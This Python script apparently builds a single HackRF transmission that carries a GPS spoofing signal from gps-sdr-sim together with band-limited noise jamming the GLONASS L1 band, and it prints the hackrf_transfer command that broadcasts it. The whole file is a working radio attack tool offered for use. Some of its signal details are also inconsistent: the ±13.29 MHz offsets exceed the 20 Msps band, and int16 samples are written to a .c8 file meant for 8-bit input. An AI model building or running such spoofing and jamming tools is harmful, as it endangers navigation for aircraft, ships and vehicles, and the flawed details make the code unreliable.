#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
glonass_inject.py
-----------------
Combines a GPS spoof IQ file (from gps-sdr-sim) with GLONASS-band noise
into a single IQ file transmittable by ONE HackRF at 20 Msps.

KEY INSIGHT:
  GPS L1:     1575.420 MHz
  GLONASS L1: 1598-1606 MHz (center 1602 MHz)
  Gap:        26.58 MHz

  Set HackRF center to 1588.710 MHz (midpoint).
    GPS offset from center:     -13.290 MHz
    GLONASS offset from center: +13.290 MHz
  At 20 Msps Nyquist = ±10 MHz — both signals fit within 20 Msps IF we 
  accept slight aliasing at the edges. Recommend 40 Msps for clean coverage.

  hackrf_transfer command:
    hackrf_transfer -t gpssim_combined.c8 -f 1588710000 -s 20000000 -a 1 -x <gain>

Usage:
  python3 glonass_inject.py -i gpssim.c8 -o gpssim_combined.c8 -a 3.0

This script does NOT modify gps-sdr-sim, gps_spoofer_core.py or gps_spoofer_gui.py.
Run it AFTER generating gpssim.c8 as normal. The GUI can be extended to call
this automatically before transmitting (optional future feature).
"""

import numpy as np
import argparse
import sys
import os
import time

# ── RF Constants ───────────────────────────────────────────────────────────────
GPS_FREQ_HZ        = 1_575_420_000   # GPS L1
GLONASS_FREQ_HZ    = 1_602_000_000   # GLONASS L1 center
CENTER_FREQ_HZ     = 1_588_710_000   # Midpoint — set hackrf_transfer -f to this

GPS_OFFSET_HZ      = GPS_FREQ_HZ    - CENTER_FREQ_HZ   # -13,290,000 Hz
GLONASS_OFFSET_HZ  = GLONASS_FREQ_HZ - CENTER_FREQ_HZ  # +13,290,000 Hz
GLONASS_BW_HZ      = 10_000_000     # 10 MHz covers all 14 GLONASS L1 channels

INPUT_SAMPLE_RATE  = 2_600_000      # gps-sdr-sim default
OUTPUT_SAMPLE_RATE = 20_000_000     # Must cover ±13.29 MHz
CHUNK_SECONDS      = 5              # Process N seconds at a time (memory limit)


def upsample_iq(iq_complex: np.ndarray, in_rate: float, out_rate: float) -> np.ndarray:
    """Resample complex IQ from in_rate to out_rate."""
    try:
        from scipy.signal import resample_poly
        from math import gcd
        ratio_num = int(out_rate)
        ratio_den = int(in_rate)
        g = gcd(ratio_num, ratio_den)
        up   = ratio_num // g   # 200
        down = ratio_den // g   # 26
        i_up = resample_poly(np.real(iq_complex).astype(np.float32), up, down)
        q_up = resample_poly(np.imag(iq_complex).astype(np.float32), up, down)
        return (i_up + 1j * q_up).astype(np.complex64)
    except ImportError:
        # numpy fallback
        n_out = int(len(iq_complex) * out_rate / in_rate)
        x_in  = np.linspace(0, 1, len(iq_complex))
        x_out = np.linspace(0, 1, n_out)
        i_up  = np.interp(x_out, x_in, np.real(iq_complex)).astype(np.float32)
        q_up  = np.interp(x_out, x_in, np.imag(iq_complex)).astype(np.float32)
        return (i_up + 1j * q_up).astype(np.complex64)


def freq_shift(iq: np.ndarray, shift_hz: float, sample_rate: float) -> np.ndarray:
    """Frequency-shift an IQ signal by shift_hz Hz."""
    n      = np.arange(len(iq), dtype=np.float32)
    phasor = np.exp(2j * np.pi * shift_hz * n / sample_rate).astype(np.complex64)
    return (iq * phasor).astype(np.complex64)


def generate_glonass_noise(num_samples: int, sample_rate: float,
                            center_offset_hz: float, bandwidth_hz: float,
                            amplitude: float, rng: np.random.Generator) -> np.ndarray:
    """Generate bandlimited GLONASS noise at center_offset_hz from IQ center."""
    noise  = (rng.standard_normal(num_samples) +
              1j * rng.standard_normal(num_samples)).astype(np.complex64)
    fft_n  = np.fft.fft(noise)
    freqs  = np.fft.fftfreq(num_samples, d=1.0/sample_rate)
    half_bw = bandwidth_hz / 2.0
    mask   = np.abs(freqs - center_offset_hz) <= half_bw
    fft_n *= mask
    noise_bp = np.fft.ifft(fft_n).astype(np.complex64)
    peak = np.max(np.abs(noise_bp))
    if peak > 0:
        noise_bp = (noise_bp / peak) * amplitude
    return noise_bp


def process(args):
    input_size        = os.path.getsize(args.input)
    total_gps_samples = input_size // 4
    gps_duration      = total_gps_samples / INPUT_SAMPLE_RATE
    est_out_samples   = int(total_gps_samples * OUTPUT_SAMPLE_RATE / INPUT_SAMPLE_RATE)
    est_size_gb       = est_out_samples * 4 / 1e9

    print("=" * 62)
    print("  GLONASS Noise Injector — Single HackRF Solution")
    print("=" * 62)
    print(f"  Input:          {args.input} ({input_size/1e9:.2f} GB)")
    print(f"  Duration:       {gps_duration:.1f}s ({gps_duration/60:.1f} min)")
    print(f"  GPS L1:         {GPS_FREQ_HZ/1e6:.3f} MHz")
    print(f"  GLONASS band:   {(GLONASS_FREQ_HZ-GLONASS_BW_HZ/2)/1e6:.0f}-"
          f"{(GLONASS_FREQ_HZ+GLONASS_BW_HZ/2)/1e6:.0f} MHz")
    print(f"  HackRF center:  {CENTER_FREQ_HZ/1e6:.3f} MHz  ← use -f {CENTER_FREQ_HZ}")
    print(f"  GPS offset:     {GPS_OFFSET_HZ/1e6:.3f} MHz")
    print(f"  GLONASS offset: +{GLONASS_OFFSET_HZ/1e6:.3f} MHz")
    print(f"  Input rate:     {INPUT_SAMPLE_RATE/1e6:.1f} Msps")
    print(f"  Output rate:    {OUTPUT_SAMPLE_RATE/1e6:.0f} Msps")
    print(f"  Noise amp:      {args.amplitude}x GPS RMS")
    print(f"  Est output:     {est_size_gb:.2f} GB")
    print(f"  Output:         {args.output}")
    print("=" * 62)

    # Check scipy
    try:
        import scipy
        print(f"  scipy:          available ✓")
    except ImportError:
        print(f"  scipy:          NOT found — install for best quality:")
        print(f"    pip install scipy --break-system-packages")

    # Disk check
    stat     = os.statvfs(os.path.dirname(os.path.abspath(args.output)) or '.')
    free_gb  = stat.f_bavail * stat.f_frsize / 1e9
    print(f"  Disk free:      {free_gb:.1f} GB")
    if free_gb < est_size_gb * 1.1:
        print(f"\n  WARNING: May not have enough disk space!")
        if not args.force:
            print("  Use --force to proceed anyway.")
            sys.exit(1)

    print(f"\n  Processing...\n")

    rng                  = np.random.default_rng(seed=42)
    chunk_gps_samples    = int(INPUT_SAMPLE_RATE * CHUNK_SECONDS)
    bytes_per_gps_chunk  = chunk_gps_samples * 4  # int16 I + int16 Q
    bytes_read           = 0
    chunk_num            = 0
    start_time           = time.time()

    with open(args.input, 'rb') as fin, open(args.output, 'wb') as fout:
        while True:
            raw = fin.read(bytes_per_gps_chunk)
            if not raw:
                break
            if len(raw) % 4 != 0:
                raw = raw[:len(raw) - (len(raw) % 4)]
            if not raw:
                break

            # ── Decode GPS int16 IQ ────────────────────────────────────────────
            gps_int16   = np.frombuffer(raw, dtype=np.int16)
            gps_complex = (gps_int16[0::2].astype(np.float32) +
                           1j * gps_int16[1::2].astype(np.float32)).astype(np.complex64)

            # ── Upsample to output rate ────────────────────────────────────────
            gps_up = upsample_iq(gps_complex, INPUT_SAMPLE_RATE, OUTPUT_SAMPLE_RATE)

            # ── Frequency shift GPS to correct offset ──────────────────────────
            # gps-sdr-sim IQ is centered at GPS L1 (0 Hz in its baseband)
            # Shift to GPS_OFFSET_HZ relative to our new center
            gps_shifted = freq_shift(gps_up, GPS_OFFSET_HZ, OUTPUT_SAMPLE_RATE)

            # ── Generate GLONASS noise ─────────────────────────────────────────
            gps_rms    = float(np.sqrt(np.mean(np.abs(gps_up) ** 2)))
            noise_amp  = gps_rms * args.amplitude
            glonass_noise = generate_glonass_noise(
                len(gps_up), OUTPUT_SAMPLE_RATE,
                GLONASS_OFFSET_HZ, GLONASS_BW_HZ,
                noise_amp, rng)

            # ── Combine ────────────────────────────────────────────────────────
            combined = gps_shifted + glonass_noise

            # ── Normalize to int16 range ───────────────────────────────────────
            peak = np.max(np.abs(combined))
            if peak > 0:
                combined = combined * (30000.0 / peak)

            out_i     = np.clip(np.real(combined), -32767, 32767).astype(np.int16)
            out_q     = np.clip(np.imag(combined), -32767, 32767).astype(np.int16)
            out_int16 = np.empty(len(combined) * 2, dtype=np.int16)
            out_int16[0::2] = out_i
            out_int16[1::2] = out_q
            fout.write(out_int16.tobytes())

            # ── Progress ───────────────────────────────────────────────────────
            bytes_read += len(raw)
            chunk_num  += 1
            pct        = bytes_read / input_size * 100
            elapsed    = time.time() - start_time
            rate       = bytes_read / elapsed / 1e6 if elapsed > 0 else 0
            eta        = (input_size - bytes_read) / (bytes_read / elapsed) if bytes_read > 0 and elapsed > 0 else 0
            print(f"\r  [{pct:5.1f}%] chunk {chunk_num} | "
                  f"{bytes_read/1e9:.2f}/{input_size/1e9:.2f} GB | "
                  f"{rate:.0f} MB/s | ETA {eta:.0f}s    ",
                  end='', flush=True)

    elapsed  = time.time() - start_time
    out_size = os.path.getsize(args.output)
    print(f"\n\n{'='*62}")
    print(f"  Done! Output: {args.output} ({out_size/1e9:.2f} GB)")
    print(f"  Time: {elapsed:.0f}s")
    print(f"{'='*62}")
    print(f"\n  Transmit command:")
    print(f"  hackrf_transfer -t {args.output} \\")
    print(f"    -f {CENTER_FREQ_HZ} -s {OUTPUT_SAMPLE_RATE} -a 1 -x <gain> -R")
    print(f"\n  ({CENTER_FREQ_HZ/1e6:.3f} MHz = midpoint between GPS L1 and GLONASS L1)")


def main():
    parser = argparse.ArgumentParser(
        description='Combine GPS spoof + GLONASS noise for single HackRF')
    parser.add_argument('-i', '--input',     default='gpssim.c8')
    parser.add_argument('-o', '--output',    default='gpssim_combined.c8')
    parser.add_argument('-a', '--amplitude', type=float, default=3.0,
                        help='GLONASS noise amplitude ratio vs GPS RMS (default: 3.0)')
    parser.add_argument('-v', '--verbose',   action='store_true')
    parser.add_argument('--force',           action='store_true',
                        help='Override disk space check')
    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"ERROR: Input file '{args.input}' not found.")
        sys.exit(1)

    process(args)


if __name__ == '__main__':
    main()
